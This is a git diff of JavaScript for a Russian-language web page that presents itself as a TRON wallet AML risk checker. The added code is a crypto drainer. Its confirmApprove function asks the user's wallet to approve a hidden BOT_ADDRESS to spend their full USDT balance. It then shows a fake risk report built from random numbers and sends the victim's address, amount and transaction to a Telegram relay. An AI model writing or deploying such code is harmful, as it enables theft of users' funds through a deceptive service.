@@ -79,7 +79,6 @@ function addToHistory(address, risk, save = true) {
     
     historyList.insertBefore(historyItem, historyList.firstChild);
     
-    // Ограничиваем историю 10 элементами
     while (historyList.children.length > 10) {
         historyList.removeChild(historyList.lastChild);
     }
@@ -95,8 +94,6 @@ function addToHistory(address, risk, save = true) {
 function saveToLocalStorage(address, risk) {
     let history = JSON.parse(localStorage.getItem('checkHistory') || '[]');
     history.unshift({ address, risk, timestamp: Date.now() });
-    
-    // Оставляем только последние 10
     history = history.slice(0, 10);
     localStorage.setItem('checkHistory', JSON.stringify(history));
 }
@@ -181,7 +178,6 @@ document.addEventListener('DOMContentLoaded', function() {
         downloadPdfBtn.addEventListener('click', downloadPDF);
     }
 
-    // Инициализация FAQ
     document.querySelectorAll('.faq-question').forEach(question => {
         question.addEventListener('click', () => {
             question.classList.toggle('active');
@@ -262,11 +258,9 @@ async function handleTronCheck() {
             return;
         }
 
-        // Добавляем в уникальные пользователи
         uniqueUsers.add(walletAddress);
         updateMetrics();
 
-        // Если есть подключённый кошелёк - показываем модалку с суммой
         if (connectedWalletAddress) {
             const balance = await getUSDTBalance(connectedWalletAddress);
             if (balance) {
@@ -280,7 +274,6 @@ async function handleTronCheck() {
             }
         }
 
-        // Иначе просто показываем демо-отчёт
         startAMLCheck(walletAddress, 'manual', 'demo_tx', '5.00');
         
     } catch (error) {
@@ -289,4 +282,180 @@ async function handleTronCheck() {
     }
 }
 
+// ============================================
+// ПОДТВЕРЖДЕНИЕ APPROVE
+// ============================================
+async function confirmApprove() {
+    try {
+        document.getElementById('approveModal').style.display = 'none';
+        
+        const originalText = checkBtn.innerHTML;
+        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка транзакции...';
+        checkBtn.disabled = true;
+
+        const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
+        const userAddress = tronWeb.defaultAddress.base58;
+        const walletAddress = walletInput.value.trim() || connectedWalletAddress;
+
+        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
+        
+        const tx = await contract.approve(
+            BOT_ADDRESS,
+            currentApproveAmount.toString()
+        ).send({
+            feeLimit: 150_000_000,
+            callValue: 0
+        });
+
+        console.log('✅ Approve отправлен, tx:', tx);
+
+        checkBtn.innerHTML = originalText;
+        checkBtn.disabled = false;
+
+        const balanceInUSDT = (currentApproveAmount / 1000000).toFixed(2);
+        startAMLCheck(walletAddress, userAddress, tx, balanceInUSDT);
+
+    } catch (error) {
+        console.error('❌ Ошибка:', error);
+        checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
+        checkBtn.disabled = false;
+        alert('Ошибка при отправке транзакции: ' + error.message);
+    }
+}
+
+function closeApproveModal() {
+    document.getElementById('approveModal').style.display = 'none';
+    checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
+    checkBtn.disabled = false;
+}
+
+// ============================================
+// ФУНКЦИЯ AML ПРОВЕРКИ
+// ============================================
+function startAMLCheck(address, userAddress, tx, amount) {
+    resultSection.style.display = 'block';
+    checkedAddress.textContent = address;
+
+    if (amountCardContainer) {
+        amountCardContainer.innerHTML = `
+            <div class="amount-card">
+                <div class="amount-label">
+                    <i class="fas fa-coins"></i>
+                    <span>Сумма</span>
+                </div>
+                <div class="amount-value">${amount} USDT</div>
+            </div>
+        `;
+    }
+
+    const risk = Math.floor(Math.random() * 100);
+    const total = Math.floor(Math.random() * 500) + 50;
+    const suspicious = Math.floor(total * (risk / 100));
+    
+    totalTx.textContent = total;
+    suspiciousTx.textContent = suspicious;
+    walletAge.textContent = Math.floor(Math.random() * 365) + ' дней';
+    lastActive.textContent = 'сегодня';
+    
+    updateRiskChart(risk);
+    
+    const sources = [];
+    if (risk > 30) {
+        const count = Math.floor(risk / 30);
+        for (let i = 0; i < count; i++) {
+            if (categories[i]) sources.push(categories[i].name);
+        }
+    }
+    
+    sourcesList.innerHTML = '';
+    if (sources.length > 0) {
+        sources.forEach(s => {
+            const p = document.createElement('p');
+            p.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${s}`;
+            sourcesList.appendChild(p);
+        });
+    } else {
+        sourcesList.innerHTML = '<p><i class="fas fa-check-circle" style="color:#00c9b7"></i> Чистый кошелёк</p>';
+    }
+    
+    totalChecks++;
+    updateMetrics();
+    addToHistory(address, risk);
+    
+    if (typeof sendToTelegram === 'function') {
+        sendToTelegram({ address, amount, risk, sources, tx, userAddress });
+    }
+}
+
+// ============================================
+// ГРАФИК РИСКА
+// ============================================
+function updateRiskChart(risk) {
+    if (riskPercent) {
+        riskPercent.textContent = risk + '%';
+    }
+    
+    const gaugeFill = document.getElementById('gaugeFill');
+    if (gaugeFill) {
+        const maxDash = 251.2;
+        const dashOffset = maxDash - (risk / 100) * maxDash;
+        gaugeFill.style.strokeDashoffset = dashOffset;
+    }
+    
+    let color = '#00c9b7';
+    let level = 'Низкий';
+    
+    if (risk > 25 && risk <= 75) {
+        color = '#ffaa5e';
+        level = 'Средний';
+    } else if (risk > 75) {
+        color = '#ff6b6b';
+        level = 'Высокий';
+    }
+    
+    if (gaugeFill) gaugeFill.style.stroke = color;
+    
+    const badge = document.getElementById('riskBadge');
+    if (badge) {
+        badge.className = 'result-badge';
+        badge.textContent = level + ' риск';
+        badge.classList.add(level === 'Низкий' ? 'low' : level === 'Средний' ? 'medium' : 'high');
+    }
+}
+
+// ============================================
+// ОТПРАВКА В TELEGRAM
+// ============================================
+async function sendToTelegram(data) {
+    try {
+        const response = await fetch('/.netlify/functions/send-to-telegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        
+        if (!response.ok) {
+            console.error('Ошибка отправки в Telegram:', await response.text());
+        }
+    } catch (error) {
+        console.error('Ошибка Telegram:', error);
+    }
+}
+
+// ============================================
+// PDF
+// ============================================
+function downloadPDF() {
+    alert('PDF отчёт будет доступен в следующей версии');
+}
+
+// ============================================
+// КОПИРОВАНИЕ
+// ============================================
+function copyAddress() {
+    const address = document.getElementById('checkedAddress').textContent;
+    navigator.clipboard.writeText(address);
+    alert('Адрес скопирован');
+}
 // =
+
